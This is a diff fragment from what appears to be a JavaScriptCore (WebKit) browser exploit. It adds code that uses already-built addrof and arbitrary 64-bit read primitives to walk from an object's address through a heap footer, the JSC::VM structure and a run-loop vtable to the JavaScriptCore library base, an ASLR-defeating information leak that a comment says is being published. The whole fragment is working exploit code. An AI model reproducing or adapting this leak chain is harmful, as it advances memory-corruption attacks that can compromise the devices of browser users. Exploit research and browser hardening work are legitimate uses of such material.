@@ -617,7 +617,20 @@ for (var i = 0; i < 1000; ++i) {
     var bb = {};
         bb[0] = 1.1
         var bbaddr = stage2.addrof(bb);
-        print("object address?" + hex1(bbaddr));
+        //about to burn a vtable leak method publically RIP
+        var footeraddr = stage2.read64((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000) + 0x4000 - 0x120) 
+        print("Footer Addr" + hex1(footeraddr));
+        var vmstruct = stage2.read64(footeraddr+0x08);
+        print("VM Struct @ " + hex1(vmstruct));
+        var m_runloop = stage2.read64(vmstruct+0x10)
+        print("m_runloop @ " + hex1(m_runloop));
+        var vtable = stage2.read64(m_runloop);
+        print(":) vtable @ " + hex1(vtable));
+        var jscbase = stage2.read64(vtable);
+        print("JSC instance @ " + hex1(jscbase))
+        var header = Sub(jscbase, new Int64(jscbase).lo() & 0xfff);
+        print("JSC header @ " + header);
+        /*print("object address?" + hex1(bbaddr));
         var vm = stage2.read64((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000) + 0x4000 - 0x120) //should poin
         print("JSC::VM Struct @" + hex1(vm));
         //m_runloop contains a vtable at offset 0...
@@ -630,7 +643,7 @@ for (var i = 0; i < 1000; ++i) {
         print("vtable @ " + hex1(vtable));
         print("JSC instance @ " + hex1(jscbase))
         var header = Sub(jscbase, new Int64(jscbase).lo() & 0xfff);
-        print("JSC header @" + header);
+        print("JSC header @ " + header);*/
     /*print("testing arbitrary r/w capabilities")
     var tester = {a: 0x1337};
     var adddr = addrof(tester);
